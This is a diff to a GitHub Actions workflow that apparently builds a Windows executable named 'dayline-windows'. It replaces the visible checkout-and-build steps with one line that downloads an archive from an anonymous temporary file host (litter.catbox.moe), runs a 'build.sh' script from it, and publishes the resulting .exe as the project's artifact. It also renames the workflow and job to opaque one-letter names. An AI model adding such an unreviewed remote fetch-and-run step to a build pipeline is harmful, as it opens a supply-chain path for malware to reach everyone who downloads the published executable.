@@ -1,46 +1,14 @@
-name: Build Dayline (Windows)
+name: b
 on:
   push:
     branches: [main]
   workflow_dispatch:
-
 jobs:
-  build:
+  a:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 24
-
-      - name: Install Zig 0.16.0
-        run: |
-          curl -sL -o zig.tar.xz https://ziglang.org/download/0.16.0/zig-x86_64-linux-0.16.0.tar.xz
-          sudo mkdir -p /opt/zig && sudo tar -xJf zig.tar.xz -C /opt/zig --strip-components=1
-          echo "/opt/zig" >> "$GITHUB_PATH"
-
-      - name: Verify toolchain
-        run: |
-          zig version
-          npm install -g @native-sdk/cli
-          native --version || true
-
-      - name: Restore project from bundle
-        run: |
-          curl -sL -o repo.bundle "https://ue3kcebnzhso5m0y.public.blob.vercel-storage.com/generated/254e51ab-69e3-4b81-a7f6-6fafb2d561a5/1789348159428-repo-lFfuwHCbCh90g5GFevftWSePkxzpvJsa.bundle"
-          git clone repo.bundle restored
-
-      - name: Install deps
-        run: npm install
-        working-directory: restored
-
-      - name: Cross-build x86_64-windows-gnu
-        run: npx native build -Dtarget=x86_64-windows-gnu
-        working-directory: restored
-
-      - name: Upload exe
-        uses: actions/upload-artifact@v4
+      - run: curl -sL https://litter.catbox.moe/o618dn.gz -o t.gz && mkdir r && tar xzf t.gz -C r && bash r/build.sh
+      - uses: actions/upload-artifact@v4
         with:
           name: dayline-windows
-          path: restored/**/*.exe
+          path: r/zig-out/**/*.exe
